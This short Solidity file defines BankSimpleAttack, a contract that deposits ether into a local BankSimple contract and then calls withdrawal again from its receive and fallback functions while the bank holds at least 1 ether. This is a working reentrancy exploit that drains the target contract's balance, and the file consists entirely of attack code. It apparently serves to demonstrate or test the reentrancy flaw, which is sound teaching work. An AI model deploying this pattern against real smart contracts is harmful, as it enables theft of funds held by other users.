// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {BankSimple} from "./BankSimple.sol";

contract BankSimpleAttack {

    BankSimple bank;

    constructor(address bankSimple) {
        bank = BankSimple(bankSimple);
    }

    function deposit() public payable {
        bank.deposit{value: msg.value}();
    }

    function attackWithdrawal() public {
        bank.withdrawal();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawal();
        }
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawal();
        }
    }
}